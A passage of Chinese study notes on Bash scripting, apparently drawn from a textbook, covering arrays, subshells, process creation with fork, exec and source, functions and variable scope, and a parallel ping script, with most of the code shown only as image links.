src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318232535221.png" alt="image-20220318232535221"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233202420.png" alt="image-20220318233202420"></p><p>因为${name[*]}将所有数组元素视为一个整体，所以for循环仅循环一次就结束，变量i也仅取一次值，i&#x3D;”Jacob Rose Vicky RickTin”。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233302114.png" alt="image-20220318233302114"></p><p>因为${name[@]}将所有数组元素视为独立的个体，所以name数组中有多少个元素，for循环就会循环多少次，每循环一次变量i获取其中一个元素的值。</p><p>在使用数组时，数组的索引也可以是变量，这个功能Shell脚本中的普通变量是不可能实现的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233548935.png" alt="image-20220318233548935"></p><p>#报错，变量名不能使用变量</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318233901576.png" alt="image-20220318233901576"></p><p>使用第二种方式创建数组与使用第一种方式效果一样。使用第二种方式创建的数组，虽然没有明确指定索引，但系统会默认使用以0为起始值的有序数字为索引。所有数组元素的值之间使用空格符分隔。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318234338053.png" alt="image-20220318234338053"></p><p>获取数组的所有索引</p><p>使用$（）或&#96;&#96;也可以将命令的执行结果赋值给数组变量。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318234502402.png" alt="image-20220318234502402"></p><p>df &#x2F;</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318234516183.png" alt="image-20220318234516183"></p><p>删掉标题  直接从第二行开始</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318234827417.png" alt="image-20220318234827417"></p><p>除了可以使用数字作为数组的索引，是否还可以使用其他的字符串作为数组的索引呢？从4.0版本开始Bash为我们提供了一种新的关联数组，使用关联数组，数组的下标可以是任意字符串。关联数组的索引要求具有唯一性，但索引和值可以不一样。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220318235257935.png" alt="image-20220318235257935"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220318235745533.png" alt="image-20220318235745533"></p><p>unset A【b】#删除数组中某个袁术</p><p>unset A#删除整个数组</p><p>虽然可以使用${数组名[@]}或${数组名[*]}一次性获取数组中所有元素的值，但是如何单独将数组中的每个元素值提取出来呢？使用循环可以遍历数组的所有元素的值。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/image-20220319000513813.png"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319000552437.png" alt="image-20220319000552437"></p><h3 id="4-2-实战案例：斐波那契数列"><a href="#4-2-实战案例：斐波那契数列" class="headerlink" title="4.2 实战案例：斐波那契数列"></a>4.2 实战案例：斐波那契数列</h3><p> 斐波那契数列表</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319151924450.png" alt="image-20220319151924450"></p><p>该数列的特点是从第3个数开始，后面的数字等于前面两个数字之和，如1+1&#x3D;2,1+2&#x3D;3, 2+3&#x3D;5,3+5&#x3D;8…</p><p>总结推导公式为：F（n）&#x3D;F（n-1）+F（n-2）（n＞&#x3D;3, F（1）&#x3D;1,F（2）&#x3D;1）。</p><p>另外，该数列当n趋向无穷大时，前一项的值除以后一项的值所得结果无限接近黄金分割比例（0.618）。1&#x2F;1&#x3D;1, 1&#x2F;2&#x3D;0.5, 2&#x2F;3&#x3D;0.666,3&#x2F;5&#x3D;0.625, …,1346 269&#x2F;2178 309&#x3D;0.618033 988 75。因此，斐波那契数列也被称为黄金分割数列。</p><p>如何使用Shell计算斐波那契数列呢？可以将计算的数字保存到一个数组中，数组的索引就是1,2,3,4等，数组第三个元素的值等于第一个元素和第二个元素值的和，第四个元素的值等于第二个元素和第三个元素值的和。具体代码如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319153317356.png" alt="image-20220319153317356"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319153327895.png" alt="image-20220319153327895"></p><h3 id="4-3-实战案例：网站日志分析脚本"><a href="#4-3-实战案例：网站日志分析脚本" class="headerlink" title="4.3 实战案例：网站日志分析脚本"></a>4.3 实战案例：网站日志分析脚本</h3><p>通常情况下各种业务服务都会产生大量的日志文件，而对日志文件数据进行分析、统计是日常运维工作中非常重要的一个环节。通过对日志文件数据的分析，可以了解业务的运行状态、是否存在潜在的安全威胁、热点数据、时间段趋势、客户来源等信息。</p><p>使用数组可以非常方便地对数据进行存储与统计，下面以Nginx的日志文件为例，编写一个访问日志文件的分析脚本。在使用脚本分析日志文件前需要了解Nginx访问日志的内容与格式，Nginx访问日志案例如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319153447702.png" alt="image-20220319153447702"></p><p>在这条日志消息中，172.40.62.167是客户端的IP地址。第二列是一个固定的字符串”-“，没有任何含义。当Nginx配置了用户认证后，客户端访问网站时输入用户名和密码，则第三列的内容为用户名，如果没有配置用户认证则这一列也是固定字符串”-“。第四列方括号内的内容为服务器本地时间（客户端在什么时间访问的服务器）。第五列双引号内的内容包括客户端请求的页面和使用的协议，协议一般为HTTP&#x2F;1.1或HTTP2.0。第六列为HTTP返回的状态码。第七列是Nginx服务器发送给客户端的字节数（不包括响应头的大小）。第八列告诉服务器客户端是从哪个页面链接访问的，没有通过任何链接访问时这列内容为固定字符串”-“。第九列双引号内的内容是客户端信息，包含客户端使用的操作系统及浏览器等信息。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161605059.png" alt="image-20220319161605059"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319161615580.png" alt="image-20220319161615580"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161628215.png" alt="image-20220319161628215"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161643382.png" alt="image-20220319161643382"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319161651158.png" alt="image-20220319161651158"></p><h3 id="4-4-常犯错误的SubShell"><a href="#4-4-常犯错误的SubShell" class="headerlink" title="4.4 常犯错误的SubShell"></a>4.4 常犯错误的SubShell</h3><p>通过当前Shell启动的一个新的子进程或子Shell被称为SubShell（子Shell）。子Shell会自动继承父Shell的很多环境，如变量、工作目录、文件描述符等，但是反之，子Shell中的环境仅在子Shell中有效，父Shell无法读取子Shell的环境。例如，如果在父Shell中定义全局变量，子Shell中就可以调用该变量。但当在子Shell中定义一个局部或全局变量时，父Shell是无法读取该变量的。基于这样的特性，编写的脚本有时就可能出现潜在的问题。</p><p>如何生成子Shell呢？使用分组命令符号（）就可以让命令在子Shell中运行，通过Shell变量BASH_SUBSHELL可以查看子Shell的信息，该变量的初始值为0，每启动一个子Shell该变量的值会自动加1，下面通过简单的示例验证效果。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319163712157.png" alt="image-20220319163712157"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319163721194.png" alt="image-20220319163721194"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319163803838.png" alt="image-20220319163803838"></p><p>分析脚本执行结果，启动脚本后进入的Shell被认为是父Shell，当前工作目录是&#x2F;root，变量BASH_SUBSHELL的值为默认初始值0。通过（）启动了一个子Shell，子Shell继承了父Shell的变量与工作目录等环境信息，因此，在子Shell中当前工作目录依然是&#x2F;root，父Shell定义的变量hi，在子Shell中依然可以正常使用并在屏幕上显示该变量的值，同时变量BASH_SUBSHELL的值会自动加1（结果为0+1&#x3D;1）。最后为了验证父Shell不可以读取子Shell的环境信息，在子Shell中定义了一个名称为sub_hi的变量，并在子Shell中切换工作目录到&#x2F;etc。当（）结束脚本再次回到父Shell时，会发现子Shell切换工作目录对父Shell无效，父Shell当前工作目录依然是&#x2F;root，而子Shell定义的变量sub_hi在父Shell中也无法被调用，父Shell开始时定义的变量hi依然可以使用，回到父Shell后BASH_SUBSHELL自动减1（1-1&#x3D;0）。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319164050232.png" alt="image-20220319164050232"></p><p>除了（）可以启动子Shell，还有别的方式可以启动子Shell吗？</p><p>使用&amp;符号将命令放入后台会产生新的子Shell，另外使用管道符号|或者分组命令符号（）也会产生新的子Shell，使用命令替换$（）也会产生新的子Shell，在Shell脚本中执行一个外部命令同样会启动新的子Shell。</p><p>先来看一个使用管道开启子Shell后导致脚本运行错误的案例。该脚本希望通过循环读取df命令并输出第四列内容，统计所有存储设备剩余容量的总和。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170110534.png" alt="image-20220319170110534"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170133804.png" alt="image-20220319170133804"></p><p>上面的脚本之所以返回值为0，是因为使用了管道符号，管道会导致整个while循环都在子Shell中执行，在子Shell中通过循环读取df命令输出的第四列值并求和，而等所有循环结束，脚本返回父Shell后，子Shell中计算的所有值在父Shell中都无法被调用。为了方便追踪错误，将上面的脚本进行适当修改，重新编写如下脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170401903.png" alt="image-20220319170401903"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319170419360.png" alt="image-20220319170419360"></p><p>分析脚本执行结果，通过管道进入子Shell后，确实可以读取磁盘剩余容量</p><p>可以正常工作的。但是，当所有设备容量都读取完毕，循环结束后脚本会返回父Shell中，在父Shell中再次显示sum的值时，输出结果为0。</p><p>如何才可以解决这样的问题呢？通过文件重定向的方式读取文件，就不会再开启子Shell。所以，在前面的nginx_log.sh日志分析脚本中，在需要读取文件并对文件进行分析时应该使用重定向输入，而不是使用管道开启子Shell。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319170933993.png" alt="image-20220319170933993"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172222056.png" alt="image-20220319172222056"></p><p>在脚本中使用外部命令，包括加载其他脚本也都会开启一个子Shell，所以在脚本中需要调用其他脚本时一定要使用source加载。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172523563.png" alt="image-20220319172523563"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172748050.png" alt="image-20220319172748050"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319172910534.png" alt="image-20220319172910534"></p><p>从脚本执行的结果可知，在脚本中调用外部命令pstree时，查看进程树可以看到pstree命令是在subshell_05.sh下启动的一个子进程。而通过Bash调用env.sh脚本也会产生子Shell，读取完env.sh程序返回父Shell后，再显示变量的值则为空。因此，如果需要在脚本中调用其他脚本最好使用source命令加载，使用source命令加载脚本不会开启子Shell。</p><p>最后看一个后台进程的问题示例。前面章节中我们编写了测试某个网段内所有主机是否可以连通的脚本，但是默认仅在ping通主机1之后才会继续测试主机2，依此类推。如果测试一台主机需要3秒，254台主机就需要762秒（约12分钟），可以使用&amp;将ping命令放入后台，这样做的好处是可以并发测试。下面的脚本通过变量count统计可以连通的主机数量，但是，因为&amp;也会导致启动子Shell，所有子Shell中定义的计算变量的值无法在父Shell中调用，结果就导致脚本执行完成后，屏幕返回值永远为0。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319173004347.png" alt="image-20220319173004347"></p><h3 id="4-5-启动进程的若干种方式"><a href="#4-5-启动进程的若干种方式" class="headerlink" title="4.5 启动进程的若干种方式"></a>4.5 启动进程的若干种方式</h3><p>接下来讨论在Shell中执行命令创建进程的几种方式：fork方式、exec方式、source方式。</p><p>1）fork方式</p><p>通常情况下在系统中通过相对路径或绝对路径执行一个命令时，都会由父进程开启一个子进程，当子进程结束后再返回父进程，这种行为过程就叫作fork。当脚本中正常调用一个外部命令[插图]或其他脚本时，都会fork一个子Shell进程，我们的命令会运行在这个子Shell中。比如下面这个脚本中的所有语句都会fork一个子进程。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319174450006.png" alt="image-20220319174450006"></p><p>这个脚本在执行的过程中会打开另一个终端窗口，反复执行pstree可以获得如下的进程树信息。可以看出，当脚本调用一个外部命令sleep时，系统会fork一个子Shell, sleep命令是在子Shell中执行的。当脚本通过相对路径或绝对路径调用其他脚本（如tmp.sh）时，也会fork一个子进程，并且tmp.sh脚本中的命令被触发执行时也会再次fork子进程。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319174457874.png" alt="image-20220319174457874"></p><p>使用fork方式开启的子进程是父进程的一个副本，因此会自动单向继承父进程的环境，如环境变量、位置变量、资源权限、内存中的数据、信号等。但是，父进程无法继承子进程的环境。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319181223938.png" alt="image-20220319181223938"></p><p>脚本开启子进程流程图</p><p>2）exec方式</p><p>也可以使用内部命令exec调用其他命令或脚本，语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319181916473.png" alt="image-20220319181916473"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319181927146.png" alt="image-20220319181927146"></p><p>如图所示，一个脚本中包含三个命令，一个是通过exec执行ls命令，一个是使用echo命令让屏幕回显一个字符串信息，最后一个是cd命令，用于切换目录。但是，因为第一个命令使用exec调用ls，系统会使用ls命令替换当前的整个脚本，整个进程就变成了一个ls命令，当ls命令结束后进程也就结束了。原脚本中exec后面的所有命令都不会再被执行！为了防止当前脚本被覆盖，一般都会将exec写入另一个脚本，先使用fork方式调用该脚本，然后在fork的子进程中调用exec命令。下面这个脚本在执行完ls命令后会直接退出</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319182138964.png" alt="image-20220319182138964"></p><p>但是有一个特例，当exec后面的参数是文件重定向时，不会替换当前Shell环境，脚本后续的其他命令也不会受到任何影响。</p><p>3）source方式</p><p>使用source命令或．（点）可以不开启子Shell，而在当前Shell环境中将需要执行的命令加载进来，执行完加载的命令后，继续执行脚本中后续的指令。</p><p>下面看一个简单的示例。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319182428106.png" alt="image-20220319182428106"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319182506893.png" alt="image-20220319182506893"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319182649209.png" alt="image-20220319182649209"></p><p>在上面的source.sh脚本中使用source命令加载&#x2F;root&#x2F;tmp.sh脚本，source命令会在不开启子Shell的情况下，将tmp.sh中的所有命令加载到当前Shell环境中，类似tmp.sh文件中的所有命令是编写在source.sh文件中的一样</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/image-20220319182703178.png"></p><p>从进程树的角度分析，如果不使用source命令加载tmp.sh，而是直接使用路径调用脚本，则进程树效果如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319205616567.png" alt="image-20220319205616567"></p><p>如果使用source命令加载其他脚本（如tmp.sh），则其他脚本中的命令将被载入当前Shell中直接执行，进程树效果如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319205632345.png" alt="image-20220319205632345"></p><h3 id="4-6-非常实用的函数功能"><a href="#4-6-非常实用的函数功能" class="headerlink" title="4.6 非常实用的函数功能"></a>4.6 非常实用的函数功能</h3><p>与大多数开发语言一样，Shell同样支持函数功能。函数就是给一段代码起一个别名，也就是函数名，定义函数名的规则与定义变量名的规则基本一致，但是函数名允许以数字开头。使用函数可以方便地封装某种特定功能的代码，在调用函数时不需要关心它是如何实现的，只需知道这个函数是做什么的，就可以直接调用它完成某项功能。函数必须先定义，才能被调用。合理地使用函数可以将一个大的工程分割为若干小的功能模块，代码的可读性更好，还可以有效避免代码重复。</p><p>定义函数的语法格式有多种，可以任选一种方式，调用函数时直接写函数名即可。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319205801519.png" alt="image-20220319205801519"></p><p>在命令行就可以直接演示函数的定义和调用，下面是简单的语法格式演示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319210232406.png" alt="image-20220319210232406"></p><p>定义函数并不会导致函数内的任何命令被执行，仅当通过函数名称调用时，函数内的命令才会被触发执行。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319210357598.png" alt="image-20220319210357598"></p><p>如果需要取消函数，可以使用unset命令取消函数的定义。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319210409513.png" alt="image-20220319210409513"></p><p>在实际编写脚本时，经常会使用函数的功能给脚本编写提示信息，比如脚本的帮助或用法信息。下面就是这样的示例脚本文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319211257115.png" alt="image-20220319211257115"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319211307356.png" alt="image-20220319211307356"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319211602267.png" alt="image-20220319211602267"></p><p>通过上面的示例可以知道，函数其实类似于别名，就是给一段代码起一个别名，当调用该别名时函数中的代码就会被触发执行。但是，前面示例中的函数并不能被反复调用，因为函数体内编写的代码用的全部都是常量，所以在第二次被调用时就会创建名称相同的目录与文件。这样的函数非常不灵活。怎么解决这个问题呢？答案是使用变量！Shell中的函数支持传递参数，可以通过向函数体内传递变量参数，确保函数可以被反复调用。</p><p>在函数体内部可以通过变量$1、$2读取位置参数，在调用函数时添加相应的参数即可，或者读取其他全局变量都可以实现传递变量参数的功能。</p><p>实现上面功能的函数代码如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319212253606.png" alt="image-20220319212253606"></p><p>有了这种通过位置变量传递参数的机制，就可以使用函数编写更加灵活的脚本，比如监控服务功能就可以写成函数，通过传递变量就可以编写一个通用的监控服务是否启动的脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319213849225.png" alt="image-20220319213849225"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319213859363.png" alt="image-20220319213859363"></p><p>上面的脚本在调用函数时添加了不止一个参数，而在函数体内通过$@就可以读取所有位置参数，并通过for循环遍历每一个参数，在for循环内部使用if语句判断服务是否启动。这个脚本中定义的函数也可以被反复调用，每次调用时添加不同的位置参数，即可检测不同服务的状态。</p><h3 id="4-7-变量的作用域与return返回值"><a href="#4-7-变量的作用域与return返回值" class="headerlink" title="4.7 变量的作用域与return返回值"></a>4.7 变量的作用域与return返回值</h3><p>Shell脚本中执行函数时并不会开启子进程，默认在函数外部或函数内部定义和使用变量的效果相同。函数外部的变量在函数内部可以直接调用，反之函数内部的变量也可以在函数外部直接调用。但这样会导致变量混淆、数据可能被错误地修改等问题，下面通过一个示例看看变量的作用域问题。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319215031920.png" alt="image-20220319215031920"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319215112310.png" alt="image-20220319215112310"></p><p>分析脚本输出结果，在demo函数外部定义的两个变量在函数内部都可以被调用，并且还可以被修改。默认global_var1和global_var2为当前Shell环境中的全局变量[插图]，而执行函数不会开启子Shell，因此在函数内部也可以调用和修改变量。示例中在函数内部修改了global_var2的参数值，而在demo函数中定义的变量func_var默认也是全局变量，因此在函数外部使用echo命令调用函数内部变量func_var是可以正常显示的，而global_var2参数值在函数中被修改了，最终脚本输出的也是修改后的内容。</p><p>但是，这样的结果有时并不是我们希望看到的。在一个实际工程脚本文件中，有时会因为在函数外部和函数内部定义了相同名称的变量，从而导致数据被意外篡改！如何防止在函数内部修改函数外部的全局变量呢？可以通过local语句定义仅在函数内部有效的局部变量</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319221525825.png" alt="image-20220319221525825"></p><p>分析执行结果，首先在脚本开始时定义了两个全局变量global_var1和global_var2，然后在函数内部使用local命令定义一个与全局变量重名的局部变量global_var2，并设置新的变量值，但是这样并不会覆盖全局变量的值。在函数内部调用变量global_var1时，因为在函数内部没有与之重名的变量，所以直接显示全局变量的值。而在函数内部调用变量global_var2时，因为在函数内部定义了与全局变量重名的global_var2，系统会优先调用函数内部的局部变量，所以输出的结果为Broke Girls。最后当函数执行结束时，在函数外部再次使用echo命令调用global_var1和global_var2变量，并不会受函数的任何影响，输出结果仍然是全局变量的值：hello world。</p><p>正常情况下定义的普通变量和数组都是在当前Shell中有效的全局变量。但是使用declare定义的关联数组则是一种特殊情况，在函数外部定义的关联数组为全局变量，而在函数体内部定义的关联数组则默认是在函数内部有效的局部变量。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319222240083.png" alt="image-20220319222240083"></p><p>分析脚本执行结果，在函数体外定义的普通数组变量a和在函数体内定义的普通数组重名，因为默认情况下都是全局变量，所以数组变量a的值被覆盖，不管在函数内部还是外部，屏幕显示的都是覆盖后的新值（xx yy zz）。而关联数组是个特例，在函数外部定义的关联数组b为全局变量，虽然在函数内部也定义了同名的关联数组变量，但是仅在函数内部调用数组b时才显示88和99，在函数外部调用数组b时显示的结果依然是11和22。</p><p>最后还有一个注意事项，定义函数不会导致函数被执行，因此在没有调用函数时，无论是全局变量还是局部变量，都不可以在外部和内部之间相互调用。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319223327113.png" alt="image-20220319223327113"></p><p>分析脚本执行结果，在这个示例中仅定义了函数，但并没有调用函数，因此在函数内部定义的变量func_var及对变量global_var2的修改实际上都没有被执行。当在函数外部使用echo命令调用func_var时实际就是空值，global_var1和global_var2变量的值也没有任何变化，最后的输出结果为hello world。</p><p>执行完函数后，默认整个函数的状态码为函数内部最后一个命令的返回值。我们在3.10节中学习了使用exit命令自定义返回码，但是在函数中如果使用了exit命令就会导致整个脚本直接退出。可以使用return命令立刻让函数中断并返回特定的状态码，并且不会影响脚本中后续的其他命令。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319224311210.png" alt="image-20220319224311210"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319225416947.png" alt="image-20220319225416947"></p><p>分析脚本执行结果，脚本中定义了三个函数，分别是demo1、demo2和demo3。demo1函数中没有自定义任何返回码，因此在脚本中调用demo1函数后，使用echo命令查看函数返回状态码为0（也就是函数内uname -r命令的返回码）。demo2函数使用return命令自定义的返回码为100，因为return会让函数立刻中断，所以调用demo2函数时，屏幕仅显示start demo2而不会显示demo2 end，调用完函数后，再通过echo命令查看函数的返回码为自定义的100。最后一个函数使用了exit命令，该命令不仅中断了函数，同时中断了整个脚本，因此调用demo3函数时，屏幕显示hello，然后整个脚本意外中断，并没有执行后续的echo命令，也没有显示demo3函数的返回码。</p><h3 id="4-8-实战案例：多进程的ping脚本"><a href="#4-8-实战案例：多进程的ping脚本" class="headerlink" title="4.8 实战案例：多进程的ping脚本"></a>4.8 实战案例：多进程的ping脚本</h3><p>前面已经使用循环语句编写过ping某个网络内所有主机连通性的脚本，但是当时的脚本并没有使用函数，也没有使用&amp;符号开启后台子进程脚本，所以整个脚本的执行效率非常低。现在学习了函数及子Shell的知识，就可以重新优化编写功能更强大、效率更高的ping测试脚本了。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319232140681.png" alt="image-20220319232140681"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319232316864.png" alt="image-20220319232316864"></p><p>真的很快</p><p>分析脚本执行结果，因为在循环体中是以后台方式执行multi_ping函数的，所以不再需要等待第一台主机测试完成后再测试下一台主机，瞬间就可以将254台主机的测试任务都放入后台执行。屏幕的返回结果是无序的，谁先回应ping消息，屏幕就先返回谁的信息。</p><p>这样的脚本仅耗时几秒就可以测试整个网段。但是，这个脚本还是有问题！脚本瞬间将254个进程放入后台，脚本瞬间已经把所有需要执行的命令都执行完毕，然后脚本退出。所以在执行完脚本后的一瞬间，当脚本中的命令执行完后系统就返回命令行，而在系统返回命令行后，还在后台执行ping的命令会开始慢慢返回执行结果（可以连通或不能连通的信息），因此192.168.4.6 is up这个信息就显示在命令提示符的后面。更大的问题是，其实脚本执行的一瞬间就返回命令行，但是254个ping返回全部结果却需要几秒，等所有返回结果都显示在屏幕上后，屏幕就有可能宕机！因为系统早已返回命令行，命令行的提示符也已经在脚本执行后的一瞬间返回并显示了，这样就需要手动执行一个回车操作才可以继续后面的其他操作。出现这样的问题就是因为脚本退出的速度太快，解决这个问题可以使用wait命令，该命令后如果输入进程号作为参数，可以等待某个进程或后台进程结束并返回该进程的状态。如果没有指定任何参数，则wait会等待当前Shell激活的所有子进程结束，返回状态为最后一个进程的退出状态。</p><p>我们可以继续优化上面的脚本，在脚本最后添加一个wait命令，这样可以在所有的后台子进程都结束，也就是所有的ping测试都结束后，再退出脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319232848436.png" alt="image-20220319232848436"></p><h3 id="4-9-控制进程数量的核心技术——文件描述符和命名管道"><a href="#4-9-控制进程数量的核心技术——文件描述符和命名管道" class="headerlink" title="4.9 控制进程数量的核心技术——文件描述符和命名管道"></a>4.9 控制进程数量的核心技术——文件描述符和命名管道</h3><p>经过前面的优化，一个多进程的脚本基本已经成型。但还有问题需要解决，在执行多进程脚本的同时在其他终端窗口使用ps aux命令查看进程列表，会发现同时启动了几百个进程，对于ping这样的小程序还好，如果是一个非常消耗CPU、内存、磁盘I&#x2F;O资源的程序呢？启动几百个这样的程序并行执行，系统会瞬间崩溃！</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/CD/image-20220320195705630.png"></p><p>我们需要想办法控制进程的数量，比如一次仅启动10个进程，等待这10个进程都结束再启动10个，依此类推。如何控制进程的数量呢？这里需要引入文件描述符和命名管道的概念</p><h4 id="1）文件描述符"><a href="#1）文件描述符" class="headerlink" title="1）文件描述符"></a>1）文件描述符</h4><p>文件描述符是一个非负整数，而内核需要通过这个文件描述符才可以访问文件。当我们在系统中打开已有的文件或新建文件时，内核每次都会给特定的进程返回一个文件描述符，当进程需要对文件进行读或写操作时，都要依赖这个文件描述符进行。文件描述符就像一本书的目录页数（也叫索引），通过这个索引可以找到需要的内容。在Linux或类UNIX系统中内核默认会为每个进程创建三个标准的文件描述符，分别是0（标准输入）、1（标准输出）和2（标准错误）。通过查看&#x2F;proc&#x2F;PID号&#x2F;fd&#x2F;目录下的文件，就可以查看每个进程拥有的所有文件描述符。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320200123269.png" alt="image-20220320200123269"></p><p>查看当前shell的文件描述符</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320200218838.png" alt="image-20220320200218838"></p><p>查看system的文件描述符</p><p>当打开文件时系统内核就会为特定的进程自动创建对应的文件描述符。下面通过示例演示这样一个过程，首先开启一个命令终端，在命令行中使用nano打开任意一个文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320200328977.png" alt="image-20220320200328977"></p><p>同时开启第二个终端窗口，通过ps命令查看vim进程的进程号，并观察该进程的文件描述符。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320201327386.png" alt="image-20220320201327386"></p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220320201430908.png" alt="image-20220320201430908"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320201734618.png" alt="image-20220320201734618"></p><p>除了系统自动创建文件描述符，还可以通过命令手动自定义文件描述符。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320202229775.png" alt="image-20220320202229775"></p><p>关闭文件描述符语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320202245477.png" alt="image-20220320202245477"></p><p>创建只可重定向输出的test文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320203001409.png" alt="image-20220320203001409"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220320202903540.png" 